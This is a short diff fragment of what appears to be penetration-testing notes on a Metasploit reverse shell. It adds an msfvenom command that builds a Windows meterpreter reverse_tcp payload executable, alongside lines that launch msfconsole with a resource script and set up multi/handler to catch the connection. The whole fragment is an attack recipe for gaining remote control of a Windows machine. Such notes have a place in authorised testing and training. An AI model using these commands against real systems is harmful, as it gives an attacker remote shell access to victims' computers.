@@ -11,6 +11,7 @@ exploit -j -z
 ======================
  SCRIPT Reverse Shell
 ======================
+- msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> PORT=4444 -f exe > shell.exe
 - msfconsole -r msfremote_shell.rc   :: Execute the script
 
 use multi/handler
